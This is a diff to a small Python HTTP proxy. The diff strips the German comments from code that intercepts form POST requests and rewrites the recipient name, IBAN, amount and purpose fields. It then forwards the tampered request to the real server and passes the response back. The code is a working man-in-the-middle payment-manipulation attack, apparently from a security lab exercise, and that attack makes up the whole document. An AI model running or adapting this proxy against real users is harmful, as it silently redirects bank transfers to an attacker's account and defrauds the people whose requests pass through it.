@@ -11,31 +11,28 @@ class MyHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         self.wfile.write(req.read())
 
     def do_POST(self):
-        # Payload Request lesen
+        
         length = int(self.headers['Content-Length'])
         payload = self.rfile.read(length)
 
         payload = urllib.parse.parse_qs(payload)
         print(payload)
 
-        # payload maniplulieren
-        payload[b'name'] = [b'user'] # "b" - String lateral um binäre Daten zu repräsentaieren 
+        
+        payload[b'name'] = [b'user'] # "b" 
         payload[b'iban'] = [b'DE1324567890135792468']
         payload[b'amount'] = [b'499']
         payload[b'purpose'] = [b'Test']
         print(payload)
 
-        # payload wieder in bytes umwandeln
-        payload = urllib.parse.urlencode(payload, doseq=True).encode()
         
-        # content-length updaten
-        self.headers['Content-Length'] = str(len(payload))
+        payload = urllib.parse.urlencode(payload, doseq=True).encode()
 
-         # manipulierte Request
+        self.headers['Content-Length'] = str(len(payload))
+        
         req = urllib.request.Request(self.path, data=payload, headers=self.headers, method="POST")
         res = urllib.request.urlopen(req)
 
-        # antwort vom server an client schicken
         self.send_response(res.getcode())
         self.end_headers()
         self.wfile.write(res.read())
